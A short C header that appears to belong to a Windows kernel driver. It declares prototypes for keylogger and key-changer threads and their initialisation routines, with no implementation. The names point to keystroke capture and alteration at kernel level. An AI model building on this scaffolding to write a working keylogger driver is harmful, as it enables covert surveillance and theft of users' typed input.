#ifndef _KBDFUNCS_H_
#define _KBDFUNCS_H_
 
//////////////////////// 
// PROTOTYPES 
////////////////////////// 
VOID ThreadKeyLogger( IN PVOID pContext); 
VOID ThreadKeyChanger( IN PVOID pContext);
NTSTATUS InitThreadKeyLogger(IN PDRIVER_OBJECT pDriverObject); 
NTSTATUS InitThreadKeyChanger(IN PDRIVER_OBJECT pDriverObject);
#endif